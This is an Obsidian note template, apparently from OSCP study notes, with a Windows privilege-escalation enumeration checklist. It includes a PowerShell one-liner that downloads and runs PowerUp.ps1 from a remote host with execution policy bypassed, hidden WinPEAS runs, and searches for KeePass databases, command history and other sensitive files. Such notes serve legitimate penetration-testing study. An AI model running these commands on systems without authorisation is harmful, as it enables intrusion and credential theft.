---
icon: 🗒
target:
- ""
createdAt: "{{DATE}}"
imageNameKey: nota_<% tp.file.title.split(" ").join("_").toLowerCase() %>
tags: 
NoteRel:
---
## Local Machine enumeration Checklist
- [ ] Username, hostname and privileges
- [ ] Groups Memberships of the current user
- [ ] Existing users and groups
- [ ] Operating System, version, arch and security updates
- [ ] Network information
- [ ] installed Applications x64 and x86
- [ ] Running Process
- [ ] Sensitive File Search
- [ ] PowerShell History and Transcript
- [ ] Powershell Env Variables
- [ ] Schedule tasks
- [ ] Services Running

## Privesc Checklist
- [ ] Installed softwares vulnerabilities
- [ ] Schedule Tasks
- [ ] Services Running
- [ ] WinPeas
- [ ] Bloodhound
- [ ] DLL Hijacking
- [ ] winlogon
- [ ] putty

## References
[Windows Privilege Escalation - Situation Awareness](obsidian://open?vault=OSCP-Study-Notes&file=Windows%20Privilege%20Escalation%2FSituational%20Awareness)
https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#windows-version-and-configuration

## Initial executes - Tools Automated

### Winpeas
> cmd
```cmd
wmic process call create "cmd.exe /c C:\temp\winpeas.exe > C:\temp\winpeas.txt"
```

>powershell
```powershell
Start-Process -FilePath "C:\temp\winpeas.exe" -ArgumentList " > C:\temp\output.txt" -WindowStyle Hidden -NoNewWindow

Start-Process -FilePath "C:\temp\winpeas.exe" -RedirectStandardOutput "C:\temp\winpeas.txt" -WindowStyle Hidden
```

### Powerup
```
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://x.x.x.x/wintools/PowerUp.ps1'); Invoke-AllChecks"
```

# Enumeration for (USERNAME)
## hostname and username
```js
whoami
hostname

```

## User Privileges
```js
whoami /priv

```

## Group memberships
```js

whoami /groups

```

## Sensitive Files By User and Group
```js
Get-ChildItem -Path C:\ -Include *.kdbx,*.txt -File -Recurse -ErrorAction SilentlyContinue
```

```js
Get-ChildItem -Path C:\users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

## Powershell History and Transcript
```js
Get-History

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

cat (Get-PSReadlineOption).HistorySavePath
```

## Powershell Env Variables
```js
Get-ChildItem Env: | ft Key,Value
```

## Find-LocalAdmins
```js
Find-LocalAdmins
```

## Services Running
- Procura serviços que utilizam executaveis cujo temos permissões de acesso
- Procurar por serviços que estão em diretórios cujo temos permissões de acesso.
- utilizar PowerUp.ps1 para automatizar processo e fazer método manual.
```js
net start
sc query
```

## Schedule Tasks
- Procurar por tasks cujo o PathName tenha espaço e não tenha aspas
- Procurar por tasks cujo o binário temos permissões de acesso
- Procurar por tasks cujo o binário está num diretório que temos permissão
- Usar powerup.ps1 para automatizar
```js
schtasks /query /fo LIST 2>nul | findstr TaskName

schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM

Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```



# System Enumeration 
## Existing Users and Groups

### Users
```js
net user
```

### Groups
```js
net localgroup
Get-LocalGroup
```

## System SO, info, version, arch
```js
systeminfo
```

## Security Patches installed
```js
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }

```

## Network Information
```js
ipconfig /all

```

```js
route print

```
## Installed Applications
#### Apps x86
```js
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
#### Apps x64
```js
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

```

## Running Process
```js
Get-Process
```

## DLL Hijacking
- Se for possível, baixar o executavel do software e procurar localmente por DLLs vulneraveis.
- Procurar por arquivos de logs de software
- Procurar nome do software na internet e identificar DLLs hijacking conhecidas

```

```
